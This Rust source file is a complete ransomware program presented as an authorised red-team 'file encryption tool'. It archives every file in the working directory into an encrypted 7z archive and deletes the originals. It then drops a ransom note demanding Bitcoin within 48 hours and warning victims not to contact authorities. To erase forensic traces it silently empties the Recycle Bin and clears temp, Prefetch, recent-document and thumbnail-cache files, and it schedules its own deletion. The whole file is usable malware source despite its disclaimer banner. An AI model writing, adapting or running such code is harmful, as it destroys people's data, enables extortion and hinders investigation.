////////////////////////////////////////////////////////////////////////////////
// File Encryption Tool (Rust)
// For AUTHORIZED Red Team Operations Only
// WARNING: This will encrypt and delete files - use only in test environments
////////////////////////////////////////////////////////////////////////////////

use std::env;
use std::fs;
use std::path::{Path, PathBuf};
use std::process::{Command, Stdio};
use std::thread;
use std::time::Duration;

#[cfg(windows)]
use std::os::windows::process::CommandExt;

const ARCHIVE_NAME: &str = "encrypted_files.7z";
const RANSOM_NOTE: &str = "README_IMPORTANT.txt";
const ENCODED_PASSWORD: &str = "YW50YWk="; // Base64: "antai"

// Windows-specific constants
#[cfg(windows)]
const CREATE_NO_WINDOW: u32 = 0x08000000;

// Embedded 7z.exe binary (Windows x64)
// To update: replace 7z.exe in the project root with the latest version
#[cfg(windows)]
const EMBEDDED_7Z: &[u8] = include_bytes!("../7z.exe");

////////////////////////////////////////////////////////////////////////////////
// Main Entry Point
////////////////////////////////////////////////////////////////////////////////

fn main() {
    print_banner();

    // Get password using priority methods
    let password = get_password();
    let password_method = if env::var("ENCRYPT_KEY").is_ok() {
        "Environment Variable"
    } else if decode_base64_password().is_some() {
        "Base64 Decoded"
    } else {
        "Random Generated"
    };

    println!("\n[INFO] Current Directory: {:?}", env::current_dir().unwrap());
    println!("[INFO] Archive Name: {}", ARCHIVE_NAME);
    println!("[INFO] Password Method: {}", password_method);
    println!("\n[WARNING] Starting in 5 seconds...");
    thread::sleep(Duration::from_secs(5));

    // Step 1: Acquire 7-Zip
    println!("\n[*] Step 1/6: Locating or acquiring 7-Zip executable...");
    let seven_zip = match find_or_acquire_7zip() {
        Some(path) => {
            println!("[+] Found working 7-Zip at: {:?}", path);
            path
        }
        None => {
            eprintln!("[-] CRITICAL ERROR: Could not locate or obtain 7-Zip");
            eprintln!("[-] Please place 7z.exe or 7z2501-x64.msi in the current directory");
            std::process::exit(1);
        }
    };

    // Step 2: Create encrypted archive
    println!("\n[*] Step 2/6: Creating encrypted 7z archive...");
    println!("[*] Password: {}", password);
    println!("[*] This may take a while depending on file size...");

    if !create_encrypted_archive(&seven_zip, &password) {
        eprintln!("[-] Failed to create archive - aborting");
        std::process::exit(1);
    }

    println!("[+] Archive created successfully");

    // Step 3: Verify archive
    println!("\n[*] Step 3/6: Verifying archive integrity...");
    if !verify_archive(&seven_zip, &password) {
        eprintln!("[-] Archive verification failed - aborting deletion for safety");
        std::process::exit(1);
    }

    println!("[+] Archive verified successfully");

    // Step 4: Delete original files
    println!("\n[*] Step 4/6: Deleting original files...");
    println!("[WARNING] This will permanently delete files!");
    println!("[WARNING] Press Ctrl+C to abort in the next 5 seconds...");
    thread::sleep(Duration::from_secs(5));

    delete_original_files();

    // Step 5: Create ransom note
    println!("\n[*] Step 5/6: Creating ransom note...");
    create_ransom_note();
    println!("[+] Ransom note created: {}", RANSOM_NOTE);

    // Step 6: Cleanup and self-delete
    println!("\n[*] Step 6/6: Running cleanup...");
    cleanup_system();

    println!("\n============================================================================");
    println!("Operation Complete");
    println!("============================================================================");
    println!("[+] Encrypted archive: {}", ARCHIVE_NAME);
    println!("[+] Password: {}", password);
    println!("[+] Original files have been deleted");
    println!("\n[*] To extract files, use:");
    println!("    7z x {} -p{}", ARCHIVE_NAME, password);
    println!("============================================================================\n");

    // Self-delete
    self_delete();
}

////////////////////////////////////////////////////////////////////////////////
// Password Management
////////////////////////////////////////////////////////////////////////////////

fn get_password() -> String {
    // Method 1: Environment variable (highest priority)
    if let Ok(password) = env::var("ENCRYPT_KEY") {
        return password;
    }

    // Method 2: Base64 decoded password
    if let Some(password) = decode_base64_password() {
        return password;
    }

    // Method 3: Generate random password
    generate_random_password()
}

fn decode_base64_password() -> Option<String> {
    use base64::{Engine as _, engine::general_purpose};
    match general_purpose::STANDARD.decode(ENCODED_PASSWORD) {
        Ok(bytes) => String::from_utf8(bytes).ok(),
        Err(_) => None,
    }
}

fn generate_random_password() -> String {
    use rand::Rng;
    const CHARSET: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!#$%&*+-=";
    let mut rng = rand::thread_rng();
    (0..16)
        .map(|_| {
            let idx = rng.gen_range(0..CHARSET.len());
            CHARSET[idx] as char
        })
        .collect()
}

////////////////////////////////////////////////////////////////////////////////
// 7-Zip Acquisition
////////////////////////////////////////////////////////////////////////////////

/// Extract the embedded 7z.exe to a temporary location
#[cfg(windows)]
fn extract_embedded_7zip() -> Option<PathBuf> {
    println!("[*] Extracting embedded 7z.exe...");

    let temp_dir = env::temp_dir();
    let seven_zip_path = temp_dir.join("7z_embedded.exe");

    // Write embedded bytes to temp file
    match fs::write(&seven_zip_path, EMBEDDED_7Z) {
        Ok(_) => {
            println!("[+] Extracted embedded 7z.exe to: {:?}", seven_zip_path);

            // Test if it works
            if test_7zip(&seven_zip_path) {
                println!("[+] Embedded 7z.exe is working");
                return Some(seven_zip_path);
            } else {
                eprintln!("[!] Extracted 7z.exe failed test");
                let _ = fs::remove_file(&seven_zip_path);
            }
        }
        Err(e) => {
            eprintln!("[!] Failed to extract embedded 7z.exe: {}", e);
        }
    }

    None
}

#[cfg(not(windows))]
fn extract_embedded_7zip() -> Option<PathBuf> {
    // No embedded binary for non-Windows platforms
    None
}

fn find_or_acquire_7zip() -> Option<PathBuf> {
    // Phase 0: Try embedded 7z.exe first (highest priority)
    #[cfg(windows)]
    {
        println!("[*] Phase 0: Checking for embedded 7z.exe...");
        if let Some(path) = extract_embedded_7zip() {
            return Some(path);
        }
        println!("[!] Embedded 7z.exe not available or failed, trying other methods...");
    }

    // Phase 1: Check existing installations
    println!("[*] Phase 1: Checking for existing 7z.exe...");

    let current_dir = env::current_dir().ok()?;
    let exe_dir = env::current_exe().ok()?.parent()?.to_path_buf();

    let search_paths = vec![
        exe_dir.join("7z.exe"),
        current_dir.join("7z.exe"),
        PathBuf::from(r"C:\Program Files\7-Zip\7z.exe"),
        PathBuf::from(r"C:\Program Files (x86)\7-Zip\7z.exe"),
    ];

    for path in search_paths {
        if test_7zip(&path) {
            println!("[+] Found working 7z.exe at: {:?}", path);
            return Some(path);
        }
    }

    // Check PATH
    if let Some(path) = find_in_path("7z.exe") {
        if test_7zip(&path) {
            println!("[+] Found working 7z.exe in system PATH");
            return Some(path);
        }
    }

    // Phase 2: Check for local installers
    println!("[*] Phase 2: Checking for local installer files...");

    let installers = vec![
        (current_dir.join("7z2501-x64.msi"), "msi"),
        (current_dir.join("7z2501-x64.exe"), "exe"),
        (exe_dir.join("7z2501-x64.msi"), "msi"),
        (exe_dir.join("7z2501-x64.exe"), "exe"),
    ];

    for (installer_path, installer_type) in installers {
        if installer_path.exists() {
            println!("[+] Found local installer: {:?}", installer_path);
            if installer_type == "msi" {
                if let Some(path) = install_7zip_msi(&installer_path) {
                    return Some(path);
                }
            } else {
                if let Some(path) = install_7zip_exe(&installer_path) {
                    return Some(path);
                }
            }
        }
    }

    // Phase 3: Download from official sources
    println!("[*] Phase 3: Downloading from official sources...");

    let temp_dir = env::temp_dir();

    let downloads = vec![
        ("https://www.7-zip.org/a/7z2501-x64.msi", "7z2501-x64.msi", "msi"),
        ("https://www.7-zip.org/a/7z2501-x64.exe", "7z2501-x64.exe", "exe"),
    ];

    for (url, filename, dl_type) in downloads {
        println!("[*] Attempting download: {}", filename);
        let dest = temp_dir.join(filename);

        if download_file(url, &dest) {
            if dl_type == "msi" {
                if let Some(path) = install_7zip_msi(&dest) {
                    return Some(path);
                }
            } else {
                if let Some(path) = install_7zip_exe(&dest) {
                    return Some(path);
                }
            }
        }
    }

    None
}

fn test_7zip(path: &Path) -> bool {
    if !path.exists() {
        return false;
    }

    let result = Command::new(path)
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .status();

    match result {
        Ok(status) => status.code().unwrap_or(255) <= 1,
        Err(_) => false,
    }
}

fn find_in_path(executable: &str) -> Option<PathBuf> {
    env::var_os("PATH").and_then(|paths| {
        env::split_paths(&paths)
            .map(|dir| dir.join(executable))
            .find(|path| path.exists())
    })
}

fn download_file(url: &str, dest: &Path) -> bool {
    use reqwest::blocking::Client;

    let client = match Client::builder()
        .timeout(Duration::from_secs(120))
        .build()
    {
        Ok(c) => c,
        Err(_) => return false,
    };

    match client.get(url).send() {
        Ok(response) => {
            if response.status().is_success() {
                if let Ok(bytes) = response.bytes() {
                    if fs::write(dest, bytes).is_ok() {
                        println!("[+] Downloaded successfully: {:?}", dest);
                        return true;
                    }
                }
            }
        }
        Err(e) => {
            eprintln!("[!] Download failed: {}", e);
        }
    }

    false
}

fn install_7zip_msi(msi_path: &Path) -> Option<PathBuf> {
    println!("[*] Installing from MSI: {:?}", msi_path);

    #[cfg(windows)]
    {
        let result = Command::new("msiexec.exe")
            .args(&[
                "/i",
                msi_path.to_str()?,
                "/qn",
                "/norestart",
                &format!("INSTALLDIR=C:\\Program Files\\7-Zip"),
            ])
            .creation_flags(CREATE_NO_WINDOW)
            .status();

        if result.is_ok() {
            println!("[*] Waiting for installation to complete...");
            thread::sleep(Duration::from_secs(10));

            let install_paths = vec![
                PathBuf::from(r"C:\Program Files\7-Zip\7z.exe"),
                PathBuf::from(r"C:\Program Files (x86)\7-Zip\7z.exe"),
            ];

            for path in install_paths {
                if test_7zip(&path) {
                    println!("[+] MSI installation successful");
                    return Some(path);
                }
            }
        }
    }

    #[cfg(not(windows))]
    {
        eprintln!("[!] MSI installation only supported on Windows");
    }

    None
}

fn install_7zip_exe(exe_path: &Path) -> Option<PathBuf> {
    println!("[*] Installing from EXE: {:?}", exe_path);

    #[cfg(windows)]
    {
        let result = Command::new(exe_path)
            .arg("/S")
            .creation_flags(CREATE_NO_WINDOW)
            .status();

        if result.is_ok() {
            println!("[*] Waiting for installation to complete...");
            thread::sleep(Duration::from_secs(15));

            let install_paths = vec![
                PathBuf::from(r"C:\Program Files\7-Zip\7z.exe"),
                PathBuf::from(r"C:\Program Files (x86)\7-Zip\7z.exe"),
            ];

            for path in install_paths {
                if test_7zip(&path) {
                    println!("[+] EXE installation successful");
                    return Some(path);
                }
            }
        }
    }

    #[cfg(not(windows))]
    {
        eprintln!("[!] EXE installation only supported on Windows");
    }

    None
}

////////////////////////////////////////////////////////////////////////////////
// Archive Operations
////////////////////////////////////////////////////////////////////////////////

fn create_encrypted_archive(seven_zip: &Path, password: &str) -> bool {
    let current_dir = env::current_dir().unwrap();
    let archive_path = current_dir.join(ARCHIVE_NAME);

    let mut cmd = Command::new(seven_zip);
    cmd.args(&[
        "a",                           // Add to archive
        "-t7z",                        // Archive type
        "-m0=lzma2",                   // Compression method
        "-mx=9",                       // Maximum compression
        "-mfb=64",                     // Fast bytes
        "-md=32m",                     // Dictionary size
        "-ms=on",                      // Solid archive
        "-mhe=on",                     // Encrypt headers
        &format!("-p{}", password),    // Password
        archive_path.to_str().unwrap(),
        "*",                           // All files
        "-r",                          // Recursive
    ]);

    #[cfg(windows)]
    cmd.creation_flags(CREATE_NO_WINDOW);

    let result = cmd.stdout(Stdio::null()).stderr(Stdio::null()).status();

    match result {
        Ok(status) => {
            let code = status.code().unwrap_or(255);
            if code <= 1 {  // 0 = success, 1 = warnings (non-fatal)
                if archive_path.exists() {
                    if let Ok(metadata) = fs::metadata(&archive_path) {
                        let size = metadata.len();
                        if size > 0 {
                            println!("[+] Archive size: {} bytes", size);
                            return true;
                        }
                    }
                }
            } else {
                eprintln!("[-] 7-Zip failed with exit code: {}", code);
            }
        }
        Err(e) => {
            eprintln!("[-] Failed to execute 7-Zip: {}", e);
        }
    }

    false
}

fn verify_archive(seven_zip: &Path, password: &str) -> bool {
    let current_dir = env::current_dir().unwrap();
    let archive_path = current_dir.join(ARCHIVE_NAME);

    if !archive_path.exists() {
        eprintln!("[-] Archive not found: {:?}", archive_path);
        return false;
    }

    let size = match fs::metadata(&archive_path) {
        Ok(metadata) => metadata.len(),
        Err(_) => return false,
    };

    if size == 0 {
        eprintln!("[-] Archive is 0 bytes!");
        return false;
    }

    println!("[*] Archive size: {} bytes", size);
    println!("[*] Testing archive integrity with password...");

    let mut cmd = Command::new(seven_zip);
    cmd.args(&[
        "t",                           // Test archive
        &format!("-p{}", password),    // Password
        archive_path.to_str().unwrap(),
    ]);

    #[cfg(windows)]
    cmd.creation_flags(CREATE_NO_WINDOW);

    let result = cmd.stdout(Stdio::null()).stderr(Stdio::null()).status();

    match result {
        Ok(status) => status.code().unwrap_or(255) == 0,
        Err(_) => false,
    }
}

////////////////////////////////////////////////////////////////////////////////
// File Deletion
////////////////////////////////////////////////////////////////////////////////

fn delete_original_files() {
    let current_dir = match env::current_dir() {
        Ok(dir) => dir,
        Err(_) => return,
    };

    let mut deleted_count = 0;
    let mut failed_count = 0;

    println!("[*] Scanning for files to delete...");

    if let Ok(entries) = walk_directory(&current_dir) {
        for entry in entries {
            if should_delete(&entry) {
                println!("[*] Deleting: {:?}", entry);
                match fs::remove_file(&entry) {
                    Ok(_) => deleted_count += 1,
                    Err(_) => {
                        failed_count += 1;
                        eprintln!("[!] Failed to delete: {:?}", entry);
                    }
                }
            }
        }
    }

    println!("\n[*] Deletion Summary:");
    println!("[*]   Successfully deleted: {}", deleted_count);
    println!("[*]   Failed to delete: {}", failed_count);

    // Remove empty directories
    println!("[*] Removing empty directories...");
    remove_empty_dirs(&current_dir);
}

fn walk_directory(dir: &Path) -> std::io::Result<Vec<PathBuf>> {
    let mut files = Vec::new();

    if dir.is_dir() {
        for entry in fs::read_dir(dir)? {
            let entry = entry?;
            let path = entry.path();

            if path.is_dir() {
                if let Ok(mut subfiles) = walk_directory(&path) {
                    files.append(&mut subfiles);
                }
            } else {
                files.push(path);
            }
        }
    }

    Ok(files)
}

fn should_delete(path: &Path) -> bool {
    let filename = match path.file_name() {
        Some(name) => name.to_string_lossy(),
        None => return false,
    };

    // Skip the archive
    if filename == ARCHIVE_NAME {
        return false;
    }

    // Skip ransom note
    if filename == RANSOM_NOTE {
        return false;
    }

    // Skip 7z files
    if filename.ends_with(".7z") {
        return false;
    }

    // Skip script files
    if filename.ends_with(".bat") || filename.ends_with(".ps1") || filename.ends_with(".rs") {
        return false;
    }

    // Skip Rust project files
    if filename == "Cargo.toml" || filename == "Cargo.lock" {
        return false;
    }

    // Skip 7z executables and installers
    if filename == "7z.exe" || filename.starts_with("7z") && (filename.ends_with(".msi") || filename.ends_with(".exe")) {
        return false;
    }

    // Skip the compiled binary itself
    if filename == "encrypt_files.exe" {
        return false;
    }

    true
}

fn remove_empty_dirs(dir: &Path) {
    if let Ok(entries) = fs::read_dir(dir) {
        for entry in entries.flatten() {
            let path = entry.path();
            if path.is_dir() {
                remove_empty_dirs(&path);
                let _ = fs::remove_dir(&path); // Ignore errors
            }
        }
    }
}

////////////////////////////////////////////////////////////////////////////////
// Ransom Note
////////////////////////////////////////////////////////////////////////////////

fn create_ransom_note() {
    let note = r#"============================================================================
YOUR FILES HAVE BEEN ENCRYPTED
============================================================================

All your files have been encrypted with military-grade encryption.
To decrypt your files, you must pay the ransom.

Contact: darkweb@onion.com
Bitcoin Address: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa

After payment, you will receive the decryption key.
DO NOT attempt to decrypt files yourself or contact authorities.
This will result in permanent data loss.

You have 48 hours to comply.
============================================================================
"#;

    let _ = fs::write(RANSOM_NOTE, note);
}

////////////////////////////////////////////////////////////////////////////////
// System Cleanup
////////////////////////////////////////////////////////////////////////////////

fn cleanup_system() {
    println!("[*] Emptying Recycle Bin...");
    empty_recycle_bin();

    println!("[*] Clearing temp files...");
    clear_temp_files();

    println!("[*] Clearing prefetch files...");
    clear_prefetch();

    println!("[*] Clearing recent documents...");
    clear_recent_documents();

    println!("[*] Clearing thumbnail cache...");
    clear_thumbnail_cache();

    println!("[+] Cleanup completed");
}

#[cfg(windows)]
fn empty_recycle_bin() {
    use winapi::um::shellapi::SHEmptyRecycleBinW;
    use winapi::shared::windef::HWND;

    unsafe {
        SHEmptyRecycleBinW(
            std::ptr::null_mut() as HWND,
            std::ptr::null(),
            0x0001 | 0x0002 | 0x0004, // SHERB_NOCONFIRMATION | SHERB_NOPROGRESSUI | SHERB_NOSOUND
        );
    }
}

#[cfg(not(windows))]
fn empty_recycle_bin() {
    // Not applicable on non-Windows systems
}

fn clear_temp_files() {
    if let Ok(temp) = env::var("TEMP") {
        let temp_path = PathBuf::from(temp);
        let _ = remove_dir_contents(&temp_path);
    }

    #[cfg(windows)]
    {
        let system_temp = PathBuf::from(r"C:\Windows\Temp");
        let _ = remove_dir_contents(&system_temp);
    }
}

fn clear_prefetch() {
    #[cfg(windows)]
    {
        let prefetch = PathBuf::from(r"C:\Windows\Prefetch");
        if let Ok(entries) = fs::read_dir(&prefetch) {
            for entry in entries.flatten() {
                if entry.path().extension().and_then(|s| s.to_str()) == Some("pf") {
                    let _ = fs::remove_file(entry.path());
                }
            }
        }
    }
}

fn clear_recent_documents() {
    if let Ok(appdata) = env::var("APPDATA") {
        let recent = PathBuf::from(appdata).join(r"Microsoft\Windows\Recent");
        let _ = remove_dir_contents(&recent);
    }
}

fn clear_thumbnail_cache() {
    if let Ok(localappdata) = env::var("LOCALAPPDATA") {
        let explorer = PathBuf::from(localappdata).join(r"Microsoft\Windows\Explorer");
        if let Ok(entries) = fs::read_dir(&explorer) {
            for entry in entries.flatten() {
                let filename = entry.file_name();
                if filename.to_string_lossy().starts_with("thumbcache_") {
                    let _ = fs::remove_file(entry.path());
                }
            }
        }
    }
}

fn remove_dir_contents(path: &Path) -> std::io::Result<()> {
    if path.is_dir() {
        for entry in fs::read_dir(path)? {
            let entry = entry?;
            let path = entry.path();

            if path.is_dir() {
                let _ = fs::remove_dir_all(&path);
            } else {
                let _ = fs::remove_file(&path);
            }
        }
    }
    Ok(())
}

////////////////////////////////////////////////////////////////////////////////
// Self-Delete
////////////////////////////////////////////////////////////////////////////////

fn self_delete() {
    println!("[*] Scheduling self-delete...");

    // Clean up embedded 7z.exe
    #[cfg(windows)]
    {
        let temp_dir = env::temp_dir();
        let embedded_7z = temp_dir.join("7z_embedded.exe");
        let _ = fs::remove_file(&embedded_7z);
    }

    #[cfg(windows)]
    {
        let exe_path = match env::current_exe() {
            Ok(path) => path,
            Err(_) => return,
        };

        let exe_str = match exe_path.to_str() {
            Some(s) => s.to_string(),
            None => return,
        };

        let temp_dir = env::temp_dir();
        let temp_str = temp_dir.to_string_lossy();

        // Use cmd to delete after a delay, including embedded 7z.exe
        let delete_cmd = format!(
            "timeout /t 3 /nobreak >nul & del /f /q \"{}\" 2>nul & del /f /q encrypt_files.* 2>nul & del /f /q 7z*.* 2>nul & del /f /q \"{}\\7z_embedded.exe\" 2>nul",
            exe_str, temp_str
        );

        let _ = Command::new("cmd.exe")
            .args(&["/c", &delete_cmd])
            .creation_flags(CREATE_NO_WINDOW)
            .spawn();
    }

    #[cfg(not(windows))]
    {
        // Self-delete on Unix-like systems
        let exe_path = match env::current_exe() {
            Ok(path) => path,
            Err(_) => return,
        };

        let _ = Command::new("sh")
            .args(&["-c", &format!("sleep 3 && rm -f {:?}", exe_path)])
            .spawn();
    }
}

////////////////////////////////////////////////////////////////////////////////
// Banner
////////////////////////////////////////////////////////////////////////////////

fn print_banner() {
    println!("\n============================================================================");
    println!("File Encryption - Red Team Operation");
    println!("============================================================================");
    println!("\n[WARNING] This program will encrypt and delete files in current directory");
    println!("[WARNING] For authorized testing only - ensure proper authorization\n");
}
